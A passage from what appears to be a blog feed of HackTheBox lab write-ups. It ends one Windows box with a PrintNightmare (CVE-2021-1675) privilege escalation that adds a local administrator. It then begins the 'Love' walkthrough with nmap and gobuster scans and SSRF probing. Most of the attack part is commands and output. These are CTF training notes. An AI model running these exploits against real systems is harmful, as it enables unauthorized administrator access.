</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User permissions to remove on C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">FileSystemRights  : FullControl
</span></span><span class="line"><span class="cl">AccessControlType : Allow
</span></span><span class="line"><span class="cl">IdentityReference : RETURN<span class="se">\s</span>vc-printer
</span></span><span class="line"><span class="cl">IsInherited       : False
</span></span><span class="line"><span class="cl">InheritanceFlags  : ContainerInherit, ObjectInherit
</span></span><span class="line"><span class="cl">PropagationFlags  : None
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Acls changed successfully.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Path   : Microsoft.PowerShell.Core<span class="se">\F</span>ileSystem::C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop
</span></span><span class="line"><span class="cl">Owner  : BUILTIN<span class="se">\A</span>dministrators
</span></span><span class="line"><span class="cl">Group  : RETURN<span class="se">\D</span>omain Users
</span></span><span class="line"><span class="cl">Access : NT AUTHORITY<span class="se">\S</span>YSTEM Allow  FullControl
</span></span><span class="line"><span class="cl">         BUILTIN<span class="se">\A</span>dministrators Allow  FullControl
</span></span><span class="line"><span class="cl">         RETURN<span class="se">\A</span>dministrator Allow  FullControl
</span></span><span class="line"><span class="cl">Audit  :
</span></span><span class="line"><span class="cl">Sddl   : O:BAG:DUD:AI<span class="o">(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>SY<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>BA<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>LA<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; gc <span class="se">\\</span>printer<span class="se">\c</span>$<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop<span class="se">\r</span>oot.txt
</span></span><span class="line"><span class="cl">Access to the path <span class="s1">&#39;\\printer\c$\users\administrator\desktop\root.txt&#39;</span> is denied.
</span></span><span class="line"><span class="cl">At line:1 char:1
</span></span><span class="line"><span class="cl">+ gc <span class="se">\\</span>printer<span class="se">\c</span>$<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop<span class="se">\r</span>oot.txt
</span></span><span class="line"><span class="cl">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
</span></span><span class="line"><span class="cl">    + CategoryInfo          : PermissionDenied: <span class="o">(</span><span class="se">\\</span>printer<span class="se">\c</span>$<span class="se">\u</span>s...esktop<span class="se">\r</span>oot.txt:String<span class="o">)</span> <span class="o">[</span>Get-Content<span class="o">]</span>, UnauthorizedAccessException
</span></span><span class="line"><span class="cl">    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
</span></span></code></pre></div><h4 id="alternative--printnightmare-lpe">(Alternative)  PrintNightmare LPE</h4>
<p>And here&rsquo;s the ultimate exploit.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; Import-Module .<span class="se">\C</span>VE-2021-1675.ps1
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; Invoke-Nightmare -NewUser <span class="s2">&#34;choropys&#34;</span> -NewPassword <span class="s2">&#34;ch0ropys!&#34;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> created payload at C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\T</span>emp<span class="se">\n</span>ightmare.dll
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> using <span class="nv">pDriverPath</span> <span class="o">=</span> <span class="s2">&#34;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\mxdwdrv.dll&#34;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> added user choropys as <span class="nb">local</span> administrator
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> deleting payload from C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\T</span>emp<span class="se">\n</span>ightmare.dll
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; net user
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User accounts <span class="k">for</span> <span class="se">\\</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-------------------------------------------------------------------------------
</span></span><span class="line"><span class="cl">Administrator            choropys                 Guest
</span></span><span class="line"><span class="cl">krbtgt                   svc-printer
</span></span><span class="line"><span class="cl">The <span class="nb">command</span> completed with one or more errors.
</span></span></code></pre></div><p>The hard way to read the root flag (afaik this won&rsquo;t work if WinRM disabled).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; <span class="nv">$username</span> <span class="o">=</span> <span class="s2">&#34;choropys&#34;</span>
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; <span class="nv">$password</span> <span class="o">=</span> ConvertTo-SecureString <span class="s2">&#34;ch0ropys!&#34;</span> -AsPlainText -Force
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; <span class="nv">$cred</span> <span class="o">=</span> new-object -typename System.Management.Automation.PSCredential -argumentlist <span class="nv">$username</span>, <span class="nv">$password</span>
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; Invoke-Command -Computer localhost -Credential <span class="nv">$cred</span> -ScriptBlock <span class="o">{</span> gci C:/users/administrator/desktop/root.txt <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Mode                LastWriteTime         Length Name                                                                                                 PSComputerName
</span></span><span class="line"><span class="cl">----                -------------         ------ ----                                                                                                 --------------
</span></span><span class="line"><span class="cl">-ar---       10/14/2021  10:33 PM             <span class="m">34</span> root.txt                                                                                             localhost
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; Invoke-Command -Computer localhost -Credential <span class="nv">$cred</span> -ScriptBlock <span class="o">{</span> gc C:/users/administrator/desktop/root.txt <span class="o">}</span>
</span></span><span class="line"><span class="cl">9f8dd...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Love</title>
      <link>https://fahmifj.github.io/hackthebox/love/</link>
      <pubDate>Mon, 09 Aug 2021 05:38:45 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/love/</guid>
      <description>SSRF in beginner-level</description>
      <content:encoded><![CDATA[<p>Love from Hack The Box hosts a voting system application and an online file scanner. The file scanner is vulnerable to SSRF, which can be exploited to leak a set of credentials that can be used to login into the voting app. The photo upload functionality can be leveraged to drop a web shell, which is then used to gain interactive shell access on the machine. Enumeration of the system reveals that <code>AlwaysInstallElevated</code> is enabled, and this can be leveraged to install a malicious <code>.msi</code> installer and get SYSTEM access.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>SSRF</li>
<li>Abusing Windows <strong>AlwaysInstallElevated</strong></li>
<li>(Alternative) PrintNightmare LPE</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Burp Suite</li>
<li>WinPEAS</li>
<li>msfvenom</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full TCP scan scan discovers a bunch of open ports.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «love» «10.10.14.51» 
</span></span><span class="line"><span class="cl">$ fscan 10.10.10.239 love
</span></span><span class="line"><span class="cl">nmap -p- --min-rate<span class="o">=</span><span class="m">1000</span> 10.10.10.239 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
</span></span><span class="line"><span class="cl">nmap -p80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001,49664,49665,49666,49667,49668,49669,49670 -sC -sV -oA nmap/10-tcp-allport-love 10.10.10.239
</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-08 11:29 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.239
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.087s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT      STATE SERVICE      VERSION
</span></span><span class="line"><span class="cl">80/tcp    open  http         Apache httpd 2.4.46 <span class="o">((</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.46 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Voting System using PHP
</span></span><span class="line"><span class="cl">135/tcp   open  msrpc        Microsoft Windows RPC
</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
</span></span><span class="line"><span class="cl">443/tcp   open  ssl/http     Apache httpd 2.4.46 <span class="o">(</span>OpenSSL/1.1.1j PHP/7.3.27<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.46 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>staging.love.htb/organizationName<span class="o">=</span>ValentineCorp/stateOrProvinceName<span class="o">=</span>m/countryName<span class="o">=</span>in
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2021-01-18T14:00:16
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2022-01-18T14:00:16
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> tls-alpn: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  http/1.1
</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds Windows <span class="m">10</span> Pro <span class="m">19042</span> microsoft-ds <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
</span></span><span class="line"><span class="cl">3306/tcp  open  mysql?
</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, NULL, NotesRPC, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, WMSRequest, oracle-tns: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Host <span class="s1">&#39;10.10.14.51&#39;</span> is not allowed to connect to this MariaDB server
</span></span><span class="line"><span class="cl">5000/tcp  open  http         Apache httpd 2.4.46 <span class="o">(</span>OpenSSL/1.1.1j PHP/7.3.27<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.46 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: <span class="m">403</span> Forbidden
</span></span><span class="line"><span class="cl">5040/tcp  open  unknown
</span></span><span class="line"><span class="cl">5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
</span></span><span class="line"><span class="cl">5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>LOVE
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:LOVE, DNS:Love
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2021-04-11T14:39:19
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2024-04-10T14:39:19
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2021-08-08T15:53:52+00:00<span class="p">;</span> +21m37s from scanner time.
</span></span><span class="line"><span class="cl"><span class="p">|</span> tls-alpn: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  http/1.1
</span></span><span class="line"><span class="cl">7680/tcp  open  pando-pub?
</span></span><span class="line"><span class="cl">47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
</span></span><span class="line"><span class="cl">49664/tcp open  msrpc        Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49665/tcp open  msrpc        Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49666/tcp open  msrpc        Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49667/tcp open  msrpc        Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49668/tcp open  msrpc        Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49669/tcp open  msrpc        Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49670/tcp open  msrpc        Microsoft Windows RPC
</span></span><span class="line"><span class="cl"><span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span class="line"><span class="cl">SF-Port3306-TCP:V<span class="o">=</span>7.91%I<span class="o">=</span>7%D<span class="o">=</span>8/8%Time<span class="o">=</span>610FF878%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>NUL
</span></span><span class="line"><span class="cl">SF:L,4A,<span class="s2">&#34;F\0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.51&#39;\x20is\x20not\x20allowe
</span></span></span><span class="line"><span class="cl"><span class="s2">...[SNIP]...
</span></span></span><span class="line"><span class="cl"><span class="s2">Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">Host script results:
</span></span></span><span class="line"><span class="cl"><span class="s2">|_clock-skew: mean: 2h06m37s, deviation: 3h30m01s, median: 21m36s
</span></span></span><span class="line"><span class="cl"><span class="s2">| smb-os-discovery: 
</span></span></span><span class="line"><span class="cl"><span class="s2">|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
</span></span></span><span class="line"><span class="cl"><span class="s2">|   OS CPE: cpe:/o:microsoft:windows_10::-
</span></span></span><span class="line"><span class="cl"><span class="s2">|   Computer name: Love
</span></span></span><span class="line"><span class="cl"><span class="s2">|   NetBIOS computer name: LOVE\x00
</span></span></span><span class="line"><span class="cl"><span class="s2">|   Workgroup: WORKGROUP\x00
</span></span></span><span class="line"><span class="cl"><span class="s2">|_  System time: 2021-08-08T08:53:41-07:00
</span></span></span><span class="line"><span class="cl"><span class="s2">| smb-security-mode: 
</span></span></span><span class="line"><span class="cl"><span class="s2">|   account_used: &lt;blank&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">|   authentication_level: user
</span></span></span><span class="line"><span class="cl"><span class="s2">|   challenge_response: supported
</span></span></span><span class="line"><span class="cl"><span class="s2">|_  message_signing: disabled (dangerous, but default)
</span></span></span><span class="line"><span class="cl"><span class="s2">| smb2-security-mode: 
</span></span></span><span class="line"><span class="cl"><span class="s2">|   2.02: 
</span></span></span><span class="line"><span class="cl"><span class="s2">|_    Message signing enabled but not required
</span></span></span><span class="line"><span class="cl"><span class="s2">| smb2-time: 
</span></span></span><span class="line"><span class="cl"><span class="s2">|   date: 2021-08-08T15:53:43
</span></span></span><span class="line"><span class="cl"><span class="s2">|_  start_date: N/A
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class="line"><span class="cl"><span class="s2">Nmap done: 1 IP address (1 host up) scanned in 137.03 seconds
</span></span></span></code></pre></div><p>Most notable services are:</p>
<ul>
<li>An Apache web server that handles 3 websites on port 80, 443, and 5000 (this one is forbidden).</li>
<li>SMB on port 445, good start.</li>
<li>A MySQL server on port 3306, I will stay away from this for now because IP block</li>
<li>WinRM on 5985/6, I will use this for lateral movement if I have creds.</li>
</ul>
<p>Seeing Apache and MySQL on a Windows host, I can assume that this machine uses XAMPP.</p>
<p>Nmap also identified two hostnames: <code>www.love.htb</code> and <code>staging.love.htb</code>. I will add these to my <code>/etc/hosts</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «love» «10.10.14.51» 
</span></span><span class="line"><span class="cl">$ sudo <span class="nb">echo</span> <span class="s1">&#39;www.love.htb staging.love.htb&#39;</span> &gt;&gt; /etc/hosts
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
<p>Anonymous login is not allowed here, I will re-visit this later when I have creds.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «love» «10.10.14.51» 
</span></span><span class="line"><span class="cl">$ smbclient -N -L //10.10.10.239 
</span></span><span class="line"><span class="cl">session setup failed: NT_STATUS_ACCESS_DENIED
</span></span></code></pre></div><h3 id="tcp-5000">TCP 5000</h3>
<p>Visiting this port results in a <strong>403 Forbidden</strong> message error.</p>
<p><div class="img-container"><img src="imgs/image-20210809005411183.png" alt="image-20210809005411183"  /></div>
</p>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Visiting port 80 with the IP or the hostname returns the same content.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «love» «10.10.14.51» 
</span></span><span class="line"><span class="cl">$ <span class="k">for</span> i in 10.10.10.239 www.love.htb<span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> -n <span class="s2">&#34;</span><span class="nv">$i</span><span class="s2"> &#34;</span><span class="p">;</span> curl -s <span class="nv">$i</span> <span class="p">|</span> wc -c<span class="p">;</span> <span class="k">done</span>                      
</span></span><span class="line"><span class="cl">10.10.10.239 <span class="m">4388</span>
</span></span><span class="line"><span class="cl">www.love.htb <span class="m">4388</span>
</span></span></code></pre></div><p>On the browser, the site displays a login form of a Voting System app.</p>
<p><div class="img-container"><img src="imgs/image-20210809003519382.png" alt="image-20210809003519382"  /></div>
</p>
<p>Trying some random IDs and common passwords didn&rsquo;t work here.</p>
<p><div class="img-container"><img src="imgs/image-20210809004024045.png" alt="image-20210809004024045"  /></div>
</p>
<h4 id="gobuster">Gobuster</h4>
<p><code>Gobuster</code> discovers a bunch of directories, but one that stands out is  <code>/admin</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «love» «10.10.14.51» 
</span></span><span class="line"><span class="cl">$ gobuster dir -f -u http://www.love.htb/ -w /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -x txt,php -o gobuster/gobuster-S-80 -t <span class="nv">40</span>                                                                                                                                                           
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">Gobuster v3.1.0
</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:                     http://www.love.htb/
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:                  GET
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">40</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Extensions:              txt,php
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Add Slash:               <span class="nb">true</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">2021/08/08 13:16:14 Starting gobuster in directory enumeration <span class="nv">mode</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">/cgi-bin/             <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>
</span></span><span class="line"><span class="cl">/admin/               <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 6198<span class="o">]</span>
</span></span><span class="line"><span class="cl">/includes/            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2261<span class="o">]</span>
</span></span><span class="line"><span class="cl">/plugins/             <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2490<span class="o">]</span>
</span></span><span class="line"><span class="cl">/images/              <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2719<span class="o">]</span>
</span></span><span class="line"><span class="cl">/logout.php           <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; index.php<span class="o">]</span>
</span></span><span class="line"><span class="cl">/login.php            <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; index.php<span class="o">]</span>
</span></span><span class="line"><span class="cl">/webalizer/           <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
</span></span><span class="line"><span class="cl">/home.php             <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; index.php<span class="o">]</span>
</span></span><span class="line"><span class="cl">/index.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 4388<span class="o">]</span>             
</span></span><span class="line"><span class="cl">/phpmyadmin/          <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
</span></span><span class="line"><span class="cl">/icons/               <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 74798<span class="o">]</span>            
</span></span><span class="line"><span class="cl">/preview.php          <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; index.php<span class="o">]</span>
</span></span><span class="line"><span class="cl">/examples/            <span class="o">(</span>Status: 503<span class="o">)</span> <span class="o">[</span>Size: 402<span class="o">]</span>              
</span></span><span class="line"><span class="cl">/dist/                <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1389<span class="o">]</span>             
</span></span><span class="line"><span class="cl">/tcpdf/               <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2710<span class="o">]</span>             
</span></span><span class="line"><span class="cl">/licenses/            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 421<span class="o">]</span>              
</span></span><span class="line"><span class="cl">/server-status/       <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 421<span class="o">]</span>              
</span></span><span class="line"><span class="cl">/con.php              <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
</span></span><span class="line"><span class="cl">/con/                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
</span></span><span class="line"><span class="cl">/con.txt              <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
</span></span><span class="line"><span class="cl">/aux/                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
</span></span><span class="line"><span class="cl">/aux.php              <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
</span></span><span class="line"><span class="cl">/aux.txt              <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
</span></span><span class="line"><span class="cl">                                                             
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">2021/08/08 13:18:01 <span class="nv">Finished</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span></code></pre></div><h4 id="admin">/admin</h4>
<p>When I visit <code>/admin</code>, the page presents the same login form. But this time, instead of voter&rsquo;s ID, it uses username.</p>
<p><div class="img-container"><img src="imgs/image-20210809003454272.png" alt="image-20210809003454272"  /></div>
</p>
<p>Submitting several credentials only reveals that <code>admin</code> is a valid username here.</p>
<h3 id="tcp-80---staginglovehtb">TCP 80 - staging.love.htb</h3>
<p>On <code>staging.love.htb</code>, the site provides an online file scanner.</p>
<p><div class="img-container"><img src="imgs/image-20210809010051350.png" alt="image-20210809010051350"  /></div>
</p>
<p>The &ldquo;Demo&rdquo; menu points to <code>/beta.php</code>, and it allows visitor to insert a URL there.</p>
<p><div class="img-container"><img src="imgs/image-20210809010747052.png" alt="image-20210809010747052"  /></div>
</p>
<p>While having my netcat listener in listening mode, I entered my HTB IP there, and my listener received the following request.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «love» «10.10.14.51» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">80</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">80</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.51<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.239<span class="o">]</span> <span class="m">49806</span>
</span></span><span class="line"><span class="cl">GET /iamf HTTP/1.1
</span></span><span class="line"><span class="cl">Host: 10.10.14.51
</span></span><span class="line"><span class="cl">Accept: */*
</span></span></code></pre></div><p>Based on the received request, I&rsquo;m guessing the request was crafted using PHP curl. If the user agent contains &ldquo;WindowsPowerShell&rdquo;, I&rsquo;m going to use Responder to see if I can steal the NTLMv2 response.</p>
<p>Playing a bit with it reveals that it can render HTML.</p>
<p><div class="img-container"><img src="imgs/image-20210809014613874.png" alt="image-20210809014613874"  /></div>
</p>
<p>The key take away from here is that <code>staging.love.htb/beta.php</code> <strong>can make a HTTP request.</strong></p>
<h3 id="tcp-443---website">TCP 443 - Website</h3>
